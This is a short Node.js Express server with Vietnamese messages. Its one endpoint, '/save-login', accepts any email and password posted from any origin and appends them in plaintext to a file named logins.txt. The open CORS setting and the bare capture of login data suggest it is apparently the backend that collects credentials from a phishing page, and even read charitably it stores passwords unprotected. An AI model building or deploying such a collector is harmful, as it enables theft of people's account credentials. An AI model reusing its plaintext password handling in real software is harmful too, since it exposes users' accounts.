const express = require("express");
const fs = require("fs");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

app.post("/save-login", (req, res) => {
    const { email, password } = req.body;
    const log = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile("logins.txt", log, (err) => {
        if (err) {
            res.status(500).json({ message: "Lỗi khi lưu dữ liệu" });
        } else {
            res.json({ message: "Dữ liệu đã lưu thành công!" });
        }
    });
});

app.listen(3000, () => console.log("Server chạy tại http://localhost:3000"));
